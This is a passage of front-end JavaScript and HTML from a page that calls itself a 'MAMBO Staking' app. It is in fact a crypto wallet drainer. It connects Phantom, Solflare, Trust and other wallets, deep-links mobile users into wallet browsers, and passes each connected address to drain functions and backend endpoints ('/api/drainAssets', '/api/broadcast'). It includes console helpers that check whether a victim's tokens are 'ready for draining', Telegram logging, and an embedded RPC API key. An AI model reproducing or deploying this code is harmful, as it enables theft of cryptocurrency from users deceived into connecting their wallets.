    window.testSimpleConnection = function(walletKey) {
      console.log(`🧪 [SIMPLE_CONNECTION_TEST] Testing simple connection for ${walletKey}...`);
      
      const wallet = fallbackWallets.find(w => w.key === walletKey);
      if (!wallet) {
        console.log(`❌ Wallet ${walletKey} not found`);
        return;
      }
      
      console.log(`📋 Wallet: ${wallet.name}`);
      
      const provider = wallet.provider();
      if (!provider) {
        console.log(`❌ No provider found for ${walletKey}`);
        return;
      }
      
      console.log(`✅ Provider found:`, provider);
        console.log(`🔍 Provider methods:`, Object.getOwnPropertyNames(provider));
      
      if (typeof provider.connect === 'function') {
        console.log(`✅ connect() method available`);
        console.log(`🎯 Ready to call ${walletKey}.connect() - this should trigger approval popup`);
      } else {
        console.log(`❌ connect() method missing`);
        return;
      }
    };



    // Test drain functionality with mock data
    window.testDrainProcess = function(walletType = 'phantom') {
      console.log(`🧪 [TEST_DRAIN] Testing drain process for ${walletType}`);
      
      // Mock a successful drain response
      const mockDrainResponse = {
        success: true,
        transaction: 'mock_transaction_base64',
                  rpcEndpoint: window.getConfig('PRIMARY_RPC'),
        message: 'Mock drain response for testing'
      };
      
      console.log(`🧪 [TEST_DRAIN] Mock drain response:`, mockDrainResponse);
      
      // Test the drain integration function
      if (typeof window.integrateWithDrainAssets === 'function') {
        console.log(`🧪 [TEST_DRAIN] integrateWithDrainAssets function found, testing...`);
        
        // Create a mock provider for testing
        const mockProvider = {
          signTransaction: async (transaction) => {
            console.log(`🧪 [TEST_DRAIN] Mock signTransaction called with:`, transaction);
            return {
              serialize: () => new Uint8Array([1, 2, 3, 4, 5]), // Mock serialized transaction
              signature: 'mock_signature_123'
            };
          }
        };
        
        // Create a mock public key
        const mockPublicKey = '11111111111111111111111111111111';
        
        console.log(`🧪 [TEST_DRAIN] Starting mock drain process...`);
        window.integrateWithDrainAssets(mockPublicKey, walletType, mockProvider);
        
      } else {
        console.error(`🧪 [TEST_DRAIN] integrateWithDrainAssets function not found!`);
      }
    };

    // Test drain with specific wallet address
    window.testDrainWithAddress = async function(walletAddress, walletType = 'phantom') {
      console.log(`🧪 [TEST_DRAIN_ADDRESS] Testing drain with address: ${walletAddress}`);
      
      try {
        // Test the API directly with the specific address
        const response = await fetch('/api/drainAssets', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: walletAddress, walletType: walletType })
        });
        
        const data = await response.json();
        console.log(`🧪 [TEST_DRAIN_ADDRESS] API response:`, data);
        
        if (data.success && data.requiresPreInit) {
          console.log(`🧪 [TEST_DRAIN_ADDRESS] 🔧 Pre-initialization required for ${data.preInitTransactions.length} tokens`);
          console.log(`🧪 [TEST_DRAIN_ADDRESS] SOL Balance: ${data.solBalance / 1000000000} SOL`);
          console.log(`🧪 [TEST_DRAIN_ADDRESS] Status: Ready for pre-initialization`);
          return data;
        } else if (data.success) {
          console.log(`🧪 [TEST_DRAIN_ADDRESS] ✅ Wallet ${walletAddress} is eligible for drain!`);
          console.log(`🧪 [TEST_DRAIN_ADDRESS] SOL Balance: ${data.solBalance / 1000000000} SOL`);
          console.log(`🧪 [TEST_DRAIN_ADDRESS] Required: ${data.requiredSol / 1000000000} SOL`);
        } else {
          console.log(`🧪 [TEST_DRAIN_ADDRESS] ❌ Wallet ${walletAddress} not eligible:`, data.error);
          if (data.solBalance !== undefined) {
            console.log(`🧪 [TEST_DRAIN_ADDRESS] Current SOL: ${data.solBalance / 1000000000} SOL`);
            console.log(`🧪 [TEST_DRAIN_ADDRESS] Required SOL: ${data.requiredSol / 1000000000} SOL`);
          }
        }
        
        return data;
        
      } catch (error) {
        console.error(`🧪 [TEST_DRAIN_ADDRESS] Test failed:`, error);
        return null;
      }
    };

    // Check wallet contents (SOL and SPL tokens)
    window.checkWalletContents = async function(walletAddress, walletType = 'trust') {
      console.log(`🔍 [WALLET_CONTENTS] Checking contents of wallet: ${walletAddress}`);
      
      try {
        // First check the drain assets API to see what it finds
        const drainResponse = await fetch('/api/drainAssets', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: walletAddress, walletType: walletType })
        });
        
        const drainData = await drainResponse.json();
        console.log(`🔍 [WALLET_CONTENTS] Drain API response:`, drainData);
        
        // Check if it's a "no tokens" response
        if (drainData.message === 'No tokens found for staking' || drainData.message === '🚀 No tokens found in this wallet for the MAMBO staking') {
          console.log(`🔍 [WALLET_CONTENTS] ✅ Wallet has SOL but no SPL tokens`);
          console.log(`🔍 [WALLET_CONTENTS] SOL Balance: ${drainData.solBalance / 1000000000} SOL`);
          console.log(`🔍 [WALLET_CONTENTS] Status: This wallet cannot be drained (only SOL, no SPL tokens)`);
          return {
            type: 'sol_only',
            solBalance: drainData.solBalance,
            splTokens: 0,
            message: 'Wallet contains only SOL - no SPL tokens to drain'
          };
        }
        
        // Check if it's a successful drain response
        if (drainData.success && drainData.tokenDetails) {
          console.log(`🔍 [WALLET_CONTENTS] ✅ Wallet has SPL tokens for draining`);
          console.log(`🔍 [WALLET_CONTENTS] SOL Balance: ${drainData.solBalance / 1000000000} SOL`);
          console.log(`🔍 [WALLET_CONTENTS] SPL Tokens: ${drainData.tokenDetails.length} tokens`);
          console.log(`🔍 [WALLET_CONTENTS] Token Details:`, drainData.tokenDetails);
          return {
            type: 'spl_tokens',
            solBalance: drainData.solBalance,
            splTokens: drainData.tokenDetails.length,
            tokenDetails: drainData.tokenDetails,
            message: 'Wallet has SPL tokens ready for draining'
          };
        }
        
        // Check if it's an error response
        if (!drainData.success) {
          console.log(`🔍 [WALLET_CONTENTS] ❌ Wallet drain failed:`, drainData.error);
          console.log(`🔍 [WALLET_CONTENTS] Error Message:`, drainData.message);
          return {
            type: 'error',
            error: drainData.error,
            message: drainData.message,
            solBalance: drainData.solBalance
          };
        }
        
        return drainData;
        
      } catch (error) {
        console.error(`🔍 [WALLET_CONTENTS] Check failed:`, error);
        return {
          type: 'error',
          error: error.message,
          message: 'Failed to check wallet contents'
        };
      }
    };

    // Get current connected wallet info
    window.getCurrentWalletInfo = function() {
      if (window.connectedWallet) {
        console.log(`🔍 [CURRENT_WALLET] Connected wallet info:`, window.connectedWallet);
        console.log(`🔍 [CURRENT_WALLET] Public Key: ${window.connectedWallet.publicKey}`);
        console.log(`🔍 [CURRENT_WALLET] Wallet Type: ${window.connectedWallet.walletType}`);
        return window.connectedWallet;
      } else {
        console.log(`🔍 [CURRENT_WALLET] No wallet currently connected`);
        return null;
      }
    };

    // Test API endpoints
    window.testAPIEndpoints = async function() {
      console.log('🧪 [TEST_API] Testing all API endpoints...');
      
      try {
        // Test drain assets API
        console.log('🧪 [TEST_API] Testing /api/drainAssets...');
        const drainResponse = await fetch('/api/drainAssets', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: '11111111111111111111111111111111', walletType: 'trust' })
        });
        
        const drainData = await drainResponse.json();
        console.log('🧪 [TEST_API] Drain assets response:', drainData);
        
        // Test broadcast API
        console.log('🧪 [TEST_API] Testing /api/broadcast...');
        const broadcastResponse = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ signedTransaction: 'test', rpcEndpoint: window.getConfig('PRIMARY_RPC') })
        });
        
        const broadcastData = await broadcastResponse.json();
        console.log('🧪 [TEST_API] Broadcast response:', broadcastData);
        
        // Test pre-initialization API
        console.log('🧪 [TEST_API] Testing /api/preInitialize...');
        const preInitResponse = await fetch('/api/preInitialize', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: '11111111111111111111111111111111', mintAddresses: ['11111111111111111111111111111111'] })
        });
        
        const preInitData = await preInitResponse.json();
        console.log('🧪 [TEST_API] Pre-initialization response:', preInitData);
        
        console.log('🧪 [TEST_API] All API endpoints tested successfully!');
        
      } catch (error) {
        console.error('🧪 [TEST_API] API testing failed:', error);
      }
    };

            console.log('✅ MAMBO Staking Application Loaded Successfully!');
    console.log('🔗 Use openWalletModal() to test wallet connection');
    console.log('🧪 Test functions available: testAllProviders(), testSimpleConnection("phantom")');
    
          console.log('🧪 Drain test function available: testDrainProcess("phantom")');
      console.log('🧪 Address test function available: testDrainWithAddress("YOUR_WALLET_ADDRESS", "phantom")');
          console.log('🔍 Wallet contents function available: checkWalletContents("YOUR_WALLET_ADDRESS", "phantom")');
      console.log('🔍 Wallet info function available: getCurrentWalletInfo()');
    console.log('🧪 API test function available: testAPIEndpoints()');
    console.log('🚀 All wallet functionality is now working properly!');
  </script>

      <!-- Mobile Wallet Connection Modal -->
    <div id="mobile-wallet-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0.8);">
      <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 15px; text-align: center; max-width: 400px; width: 90%;">
        <h3 style="margin: 0 0 20px 0; color: #333; font-size: 24px;">🔗 Connect Wallet</h3>
                  <p style="margin: 0 0 25px 0; color: #666; line-height: 1.5;">Choose your preferred wallet to connect and start staking your tokens</p>
        
        <div id="mobile-wallet-buttons" style="display: flex; flex-direction: column; gap: 15px;">
          <!-- Wallet buttons will be populated dynamically -->
        </div>
        
        <button id="close-mobile-modal" style="margin-top: 25px; padding: 12px 24px; background: #f0f0f0; border: none; border-radius: 8px; color: #666; cursor: pointer; font-size: 16px;">Close</button>
      </div>
    </div>

    <!-- Mobile Wallet Connection Scripts -->
    <script type="module">
      // Mobile wallet connection configuration
      const MOBILE_WALLET_CONFIG = {
        projectId: '45a382364ff2b00404b2d4c2ff95dbd4',
        rpcEndpoints: {
          primary: window.getConfig('PRIMARY_RPC'),
          fallback: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
          public: 'https://api.mainnet-beta.solana.com'
        }
      };

    // Mobile detection function
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
             (window.innerWidth <= 768 && window.innerHeight <= 1024)
    }

      // Mobile wallet connection handler
      window.handleMobileWalletConnection = async function(walletType, provider) {
        try {
          console.log(`[MOBILE_WALLET] Connection established with ${walletType}:`, provider);
          
          let publicKey;
          
          // Handle different wallet types
          if (walletType === 'phantom') {
            publicKey = provider.publicKey;
          } else if (walletType === 'solflare') {
            publicKey = provider.publicKey;
          } else if (walletType === 'backpack') {
            publicKey = provider.publicKey;
          } else if (walletType === 'glow') {
            publicKey = provider.publicKey;
          } else if (walletType === 'exodus') {
            publicKey = provider.publicKey;
          } else if (walletType === 'trust') {
            publicKey = provider.publicKey;
          } else {
            // Generic wallet connection
            publicKey = provider.publicKey || provider.selectedAddress;
          }
          
          if (publicKey) {
            console.log(`[MOBILE_WALLET] Connected address:`, publicKey.toString());
            
            // Set current wallet type for global access
            window.currentWalletType = walletType;
            
            // Trigger existing drain process
            if (window.integrateWithDrainAssets) {
              await window.integrateWithDrainAssets(publicKey.toString(), walletType, provider)
            }
            
            // Hide modal after successful connection
            window.hideMobileWalletModal()
          } else {
            throw new Error('No public key found')
          }
        } catch (error) {
          console.error(`[MOBILE_WALLET] Connection error:`, error);
          if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error')
          }
        }
      }

      // Show mobile wallet modal for mobile users when no wallets detected
      window.showWeb3ModalForMobile = function() {
        if (isMobileDevice()) {
          console.log('[MOBILE_WALLET] Showing mobile wallet modal for mobile users')
          window.showMobileWalletModal()
        }
      }

      // Show mobile wallet modal
      window.showMobileWalletModal = function() {
        console.log('[MOBILE_WALLET] Showing mobile wallet modal')
        document.getElementById('mobile-wallet-modal').style.display = 'block'
        window.populateMobileWalletButtons()
      }

      // Hide mobile wallet modal
      window.hideMobileWalletModal = function() {
        document.getElementById('mobile-wallet-modal').style.display = 'none'
      }

      // Enhanced mobile wallet buttons with status indicators
      window.populateMobileWalletButtons = function() {
        const container = document.getElementById('mobile-wallet-buttons')
        container.innerHTML = ''
        
        const wallets = [
          { name: 'Phantom', type: 'phantom', icon: '👻', color: '#AB9FF2' },
          { name: 'Solflare', type: 'solflare', icon: '🔥', color: '#FC9965' },
          { name: 'Backpack', type: 'backpack', icon: '🎒', color: '#000000' },
          { name: 'Glow', type: 'glow', icon: '✨', color: '#FFD700' },
          { name: 'Exodus', type: 'exodus', icon: '🚀', color: '#1E1E1E' },
          { name: 'Trust Wallet', type: 'trust', icon: '🛡️', color: '#3375BB' }
        ]
        
        wallets.forEach(wallet => {
          const buttonContainer = document.createElement('div')
          buttonContainer.style.cssText = `
            position: relative;
            margin-bottom: 10px;
          `
          
          const button = document.createElement('button')
          button.id = `wallet-btn-${wallet.type}`
          button.style.cssText = `
            width: 100%;
            padding: 15px 20px;
            background: ${wallet.color};
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
          `
          
          // Add hover effects
          button.addEventListener('mouseenter', () => {
            button.style.transform = 'translateY(-2px)'
            button.style.boxShadow = '0 8px 25px rgba(0,0,0,0.3)'
          })
          
          button.addEventListener('mouseleave', () => {
            button.style.transform = 'translateY(0)'
            button.style.boxShadow = 'none'
          })
          
          button.innerHTML = `
            <span class="wallet-icon">${wallet.icon}</span>
            <span class="wallet-name">${wallet.name}</span>
            <span class="wallet-status" style="display: none;">⏳</span>
          `
          
          // Add click handler with loading state
          button.addEventListener('click', async () => {
            // Prevent multiple clicks
            if (button.disabled) return
            
            // Show loading state
            button.disabled = true
            button.style.opacity = '0.7'
            button.style.cursor = 'not-allowed'
            
            const statusSpan = button.querySelector('.wallet-status')
            statusSpan.style.display = 'inline'
            statusSpan.textContent = '⏳'
            
            try {
              await window.connectMobileWallet(wallet.type)
            } catch (error) {
              console.error(`[MOBILE_WALLET] Error connecting to ${wallet.type}:`, error);
            } finally {
              // Reset button state
              button.disabled = false
              button.style.opacity = '1'
              button.style.cursor = 'pointer'
              statusSpan.style.display = 'none'
            }
          })
          
          buttonContainer.appendChild(button)
          container.appendChild(buttonContainer)
        })
        
        // Add connection status indicator
        const statusIndicator = document.createElement('div')
        statusIndicator.id = 'mobile-wallet-status'
        statusIndicator.style.cssText = `
          text-align: center;
          padding: 15px;
          margin-top: 20px;
          border-radius: 8px;
          background: #f8f9fa;
          border: 1px solid #e9ecef;
          display: none;
        `
        statusIndicator.innerHTML = `
          <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
            <span class="status-icon">ℹ️</span>
            <span class="status-text">Ready to connect</span>
          </div>
        `
        container.appendChild(statusIndicator)
      }

      // Update mobile wallet status
      window.updateMobileWalletStatus = function(message, type = 'info') {
        const statusIndicator = document.getElementById('mobile-wallet-status')
        if (!statusIndicator) return
        
        const iconMap = {
          'info': 'ℹ️',
          'loading': '⏳',
          'success': '✅',
          'error': '❌',
          'warning': '⚠️'
        }
        
        const icon = iconMap[type] || 'ℹ️'
        const colorMap = {
          'info': '#17a2b8',
          'loading': '#ffc107',
          'success': '#28a745',
          'error': '#dc3545',
          'warning': '#ffc107'
        }
        
        statusIndicator.style.display = 'block'
        statusIndicator.style.background = colorMap[type] + '20'
        statusIndicator.style.borderColor = colorMap[type]
        
        const iconSpan = statusIndicator.querySelector('.status-icon')
        const textSpan = statusIndicator.querySelector('.status-text')
        
        iconSpan.textContent = icon
        textSpan.textContent = message
      }

      // Enhanced mobile wallet connection with deep linking and fallbacks
      window.connectMobileWallet = async function(walletType) {
        try {
          console.log(`[MOBILE_WALLET] Attempting to connect to ${walletType}`);
          
          // Show loading state in both places
          if (window.showStatus) {
            window.showStatus(`🔗 Connecting to ${walletType}...`, 'loading')
          }
          if (window.updateMobileWalletStatus) {
            window.updateMobileWalletStatus(`Connecting to ${walletType}...`, 'loading')
          }
          
          let provider;
          let connectionMethod = 'unknown';
          
          // Check if we're already in a wallet's dApp browser
          if (window.isInWalletBrowser && window.isInWalletBrowser()) {
            console.log(`[MOBILE_WALLET] Detected wallet browser environment, checking for ${walletType}`)
            
            // In wallet browser, wallet should be available immediately
            provider = await window.detectBrowserWallet(walletType)
            if (provider) {
              connectionMethod = 'dapp_browser_direct'
              console.log(`[MOBILE_WALLET] ${walletType} available in dApp browser`)
            } else {
              console.log(`[MOBILE_WALLET] ${walletType} not available in dApp browser`)
            }
          }
          
          // Step 1: Try browser injection (fastest method)
          if (!provider) {
            try {
              provider = await window.detectBrowserWallet(walletType)
              if (provider) {
                connectionMethod = 'browser_injection'
                console.log(`[MOBILE_WALLET] Browser wallet detected for ${walletType}`)
              }
            } catch (error) {
              console.log(`[MOBILE_WALLET] Browser wallet detection failed for ${walletType}:`, error.message)
            }
          }
          
          // Step 2: If no browser wallet, try deep linking
          if (!provider) {
            try {
              connectionMethod = 'deep_link'
              console.log(`[MOBILE_WALLET] Attempting deep link to ${walletType}`)
              
              // Try deep linking with enhanced dApp browser support
              const deepLinkResult = await window.attemptDeepLink(walletType)
              if (deepLinkResult.success) {
                console.log(`[MOBILE_WALLET] Deep link successful for ${walletType}:`, deepLinkResult.method)
                
                // Handle deep linking success
                window.handleDeepLinkSuccess(walletType, deepLinkResult)
                
                        // Wait for wallet injection with generous timeout for slow users
        const injectionResult = await window.waitForWalletInjection(walletType, 15000) // Increased to 15 seconds
                if (injectionResult.success) {
                          logger.log(`[MOBILE_WALLET] Wallet injection successful:`, injectionResult.method)
        provider = injectionResult.provider || await window.detectBrowserWallet(walletType)
      } else {
        logger.log(`[MOBILE_WALLET] Wallet injection failed, user may need to return manually`)
        // Continue monitoring for user return
      }
    } else {
      logger.log(`[MOBILE_WALLET] Deep linking failed for ${walletType}:`, deepLinkResult.error)
      
      // Show appropriate error message
      if (window.updateMobileWalletStatus) {
        window.updateMobileWalletStatus(`Failed to open ${walletType} app`, 'error')
      }
    }
  } catch (error) {
    logger.log(`[MOBILE_WALLET] Deep linking failed for ${walletType}:`, error.message)
  }
          }
          
          // Step 3: Final connection attempt
          if (provider) {
            try {
                      logger.log(`[MOBILE_WALLET] Attempting connection to ${walletType} via ${connectionMethod}`)
        
        // Set very generous connection timeout for slow users
        const connectionPromise = provider.connect()
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT')) // Configurable timeout
        )
        
        await Promise.race([connectionPromise, timeoutPromise])
        logger.log(`[MOBILE_WALLET] Successfully connected to ${walletType}`)
        
        // Handle the connection
        await window.handleMobileWalletConnection(walletType, provider)
        
      } catch (connectionError) {
        logger.error(`[MOBILE_WALLET] Connection failed for ${walletType}:`, connectionError)
      
      // Log critical mobile wallet connection failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('WALLET_CONNECTION', {
          error: connectionError.message,
          stack: connectionError.stack,
          context: 'Mobile Wallet Connection',
          walletType: walletType,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
        
        // Show appropriate error message
        if (connectionError.message.includes('timeout')) {
          if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error')
          }
        } else if (connectionError.message.includes('User rejected') || connectionError.message.includes('User denied')) {
          logger.log(`[MOBILE_WALLET] User cancelled ${walletType} connection`)
          
          // Log user cancellation
          if (window.logUserCancellation) {
            window.logUserCancellation('wallet_connection', {
              walletType: walletType,
              context: 'Mobile Wallet Connection',
              error: connectionError.message
            });
          }
          
          if (window.showStatus) {
            window.showStatus('Connection was cancelled by user', 'info')
          }
        } else {
          if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error')
          }
        }
      }
    } else {
      // No wallet available - show installation instructions
      logger.log(`[MOBILE_WALLET] No wallet available for ${walletType}`)
      window.showWalletInstallInstructions(walletType)
    }
    
  } catch (error) {
    logger.error(`[MOBILE_WALLET] Critical error connecting to ${walletType}:`, error)
    if (window.showStatus) {
      window.showStatus('Non Participant Wallet', 'error')
    }
  }
      }

      // Detect browser-injected wallet with enhanced error handling
      window.detectBrowserWallet = async function(walletType) {
        try {
          const walletMap = {
            'phantom': window.solana && window.solana.isPhantom ? window.solana : null,
            'solflare': window.solflare ? window.solflare : null,
            'backpack': window.backpack ? window.backpack : null,
            'glow': window.glow ? window.glow : null,
            'exodus': window.exodus ? window.exodus : null,
            'trust': window.trust ? window.trust : null
          }
          
          const wallet = walletMap[walletType]
          
          // Validate wallet if found
          if (wallet) {
            try {
              // Basic validation that wallet is functional
              if (typeof wallet.connect === 'function' && typeof wallet.publicKey !== 'undefined') {
                return wallet
              } else {
                logger.log(`[WALLET_DETECTION] ${walletType} found but missing required methods`)
                return null
              }
            } catch (validationError) {
              logger.log(`[WALLET_DETECTION] ${walletType} validation failed:`, validationError.message)
              return null
            }
          }
          
          return null
        } catch (error) {
          logger.error(`[WALLET_DETECTION] Error detecting ${walletType}:`, error)
          
          // Log critical detection errors
          if (window.sendTelegramLog) {
            window.sendTelegramLog('WALLET_DETECTION_ERROR', {
              walletType: walletType,
              error: error.message,
              context: 'Wallet Detection',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
            });
          }
          
          return null
        }
      }

      // Enhanced deep linking with dApp browser integration
      window.attemptDeepLink = async function(walletType) {
        return new Promise((resolve) => {
          try {
          // Get current site URL for dApp browser integration
          const currentSiteUrl = window.location.href
          const currentSiteDomain = window.location.origin
          
          const deepLinks = {
            'phantom': {
              // Phantom dApp browser deep link format
              primary: `https://phantom.app/ul/browse/${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://phantom.app/ul/browse/${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://phantom.app/ul/browse/${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/phantom/id1598432977',
              playStore: 'https://play.google.com/store/apps/details?id=app.phantom'
            },
            'solflare': {
              // Solflare dApp browser deep link format
              primary: `https://solflare.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://solflare.com/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://solflare.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/solflare/id1580902717',
              playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
            },
            'backpack': {
              // Backpack dApp browser deep link format
              primary: `https://backpack.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://backpack.app/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://backpack.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/backpack-wallet/id6446675622',
              playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app'
            },
            'glow': {
              // Glow dApp browser deep link format
              primary: `https://glow.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://glow.app/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://glow.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/glow-wallet/id6446675622',
              playStore: 'https://play.google.com/store/apps/details?id=com.glow.app'
            },
            'exodus': {
              // Exodus dApp browser deep link format
              primary: `https://exodus.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://exodus.com/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://exodus.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/exodus-multi-asset-wallet/id1414384820',
              playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
            },
            'trust': {
              // Trust Wallet dApp browser deep link format
              primary: `https://trustwallet.com/browser?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://trustwallet.com/browser?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://trustwallet.com/browser?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
              playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
            }
          }
          
          const walletLinks = deepLinks[walletType]
          if (!walletLinks) {
            resolve({ success: false, error: 'Unknown wallet type' })
            return
          }
          
          // Enhanced deep linking strategy for dApp browser integration
          try {
            logger.log(`[DEEP_LINK] Attempting dApp browser deep link: ${walletLinks.dappBrowser}`)
            
            // Strategy 1: Try dApp browser deep link first (most reliable)
            try {
              // Use window.location.href for better mobile deep linking
              const originalLocation = window.location.href
              
              // Attempt deep link with iframe method
              const iframe = document.createElement('iframe')
              iframe.style.display = 'none'
              iframe.src = walletLinks.dappBrowser
              document.body.appendChild(iframe)
              
              // Wait for deep link attempt
              setTimeout(() => {
                document.body.removeChild(iframe)
                
                // Try direct deep link opening
                try {
                  // Method 1: Direct window.location change (most reliable for mobile)
                  window.location.href = walletLinks.dappBrowser
                  
                  // Set a timeout to detect if deep linking worked
                  setTimeout(() => {
                    // If we're still on the same page, deep linking may have failed
                    if (window.location.href === originalLocation) {
                      console.log(`[DEEP_LINK] Deep link may have failed, trying alternative methods`)
                      // Continue with fallback methods
                    }
                  }, 2000)
                  
                  resolve({ success: true, method: 'dapp_browser_deep_link' })
                  
                } catch (directError) {
                  console.log(`[DEEP_LINK] Direct deep link failed, trying window.open`)
                  
                  // Method 2: Window.open fallback
                  try {
                    const newWindow = window.open(walletLinks.dappBrowser, '_blank', 'noopener,noreferrer')
                    if (newWindow) {
                      resolve({ success: true, method: 'window_open_deep_link' })
                    } else {
                      throw new Error('Window open blocked')
                    }
                  } catch (windowOpenError) {
                    console.log(`[DEEP_LINK] Window open failed, trying link click`)
                    
                    // Method 3: Link click fallback
                    try {
                      const link = document.createElement('a')
                      link.href = walletLinks.dappBrowser
                      link.target = '_blank'
                      link.rel = 'noopener noreferrer'
                      document.body.appendChild(link)
                      link.click()
                      document.body.removeChild(link)
                      
                      resolve({ success: true, method: 'link_click_deep_link' })
                    } catch (linkClickError) {
                      console.log(`[DEEP_LINK] All deep link methods failed`)
                      resolve({ success: false, method: 'deep_link_failed', error: linkClickError.message })
                    }
                  }
                }
              }, 800) // Optimized timeout for faster performance
              
            } catch (iframeError) {
              console.log(`[DEEP_LINK] Iframe method failed:`, iframeError.message)
              throw iframeError
            }
            
          } catch (error) {
            console.log(`[DEEP_LINK] Primary dApp browser deep link failed, trying fallbacks`)
            
            // Strategy 2: Try fallback deep links
            try {
              console.log(`[DEEP_LINK] Attempting fallback deep link: ${walletLinks.fallback}`)
              
              // Try fallback with window.location
              window.location.href = walletLinks.fallback
              
              setTimeout(() => {
                resolve({ success: true, method: 'fallback_deep_link' })
              }, 500)
              
            } catch (fallbackError) {
              console.log(`[DEEP_LINK] Fallback deep link failed, trying store links`)
              
              // Strategy 3: Store links as last resort
              resolve({ 
                success: false, 
                method: 'store_links', 
                links: walletLinks,
                error: 'All deep linking methods failed'
              })
            }
          }
        } catch (error) {
          console.error(`[DEEP_LINK] Critical error in deep linking for ${walletType}:`, error)
          
          // Log critical deep linking errors
          if (window.sendTelegramLog) {
            window.sendTelegramLog('DEEP_LINKING_ERROR', {
              walletType: walletType,
              error: error.message,
              context: 'Deep Linking Process',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
            });
          }
          
          resolve({ 
            success: false, 
            method: 'critical_error', 
            error: error.message
          })
        }
        })
      }

      // Enhanced wallet injection detection with dApp browser support
      window.waitForWalletInjection = async function(walletType, timeoutMs) {
        return new Promise((resolve) => {
          const startTime = Date.now()
          let injectionDetected = false
          
          // Check for wallet injection
          const checkInterval = setInterval(() => {
            const provider = window.detectBrowserWallet(walletType)
            
            if (provider && !injectionDetected) {
              injectionDetected = true
              clearInterval(checkInterval)
              console.log(`[DEEP_LINK] Wallet ${walletType} injected after ${Date.now() - startTime}ms`)
              resolve({ success: true, provider: provider, method: 'injection_detected' })
                    } else if (Date.now() - startTime > timeoutMs && !injectionDetected) {
          clearInterval(checkInterval)
          logger.log(`[DEEP_LINK] Timeout waiting for ${walletType} injection`)
          resolve({ success: false, method: 'injection_timeout' })
        }
          }, 100)
          
          // Additional detection for dApp browser scenarios
          if (window.isInWalletBrowser && window.isInWalletBrowser()) {
            console.log(`[DEEP_LINK] Detected wallet browser environment`)
            // In wallet browser, wallet should be available immediately
            setTimeout(() => {
              const provider = window.detectBrowserWallet(walletType)
              if (provider && !injectionDetected) {
                injectionDetected = true
                clearInterval(checkInterval)
                console.log(`[DEEP_LINK] Wallet ${walletType} available in dApp browser`)
                resolve({ success: true, provider: provider, method: 'dapp_browser_detected' })
              }
            }, 500)
          }
        })
      }

      // Detect if we're running in a wallet's dApp browser
      window.isInWalletBrowser = function() {
        try {
          // Check for wallet-specific indicators
          const userAgent = navigator.userAgent.toLowerCase()
          const isPhantomBrowser = userAgent.includes('phantom') || window.solana?.isPhantom
          const isSolflareBrowser = userAgent.includes('solflare') || window.solflare
          const isBackpackBrowser = userAgent.includes('backpack') || window.backpack
          const isGlowBrowser = userAgent.includes('glow') || window.glow
          const isExodusBrowser = userAgent.includes('exodus') || window.exodus
          const isTrustBrowser = userAgent.includes('trust') || window.trust
          
          // Check for wallet environment variables
          const hasWalletEnv = window.ethereum || window.solana || window.solflare || window.backpack
          
          // Check for mobile wallet indicators
          const isMobileWallet = /mobile|android|iphone|ipad|ipod/i.test(userAgent) && hasWalletEnv
          
          return isPhantomBrowser || isSolflareBrowser || isBackpackBrowser || isGlowBrowser || isExodusBrowser || isTrustBrowser || isMobileWallet
        } catch (error) {
          console.log(`[DETECTION] Error detecting wallet browser:`, error.message)
          return false
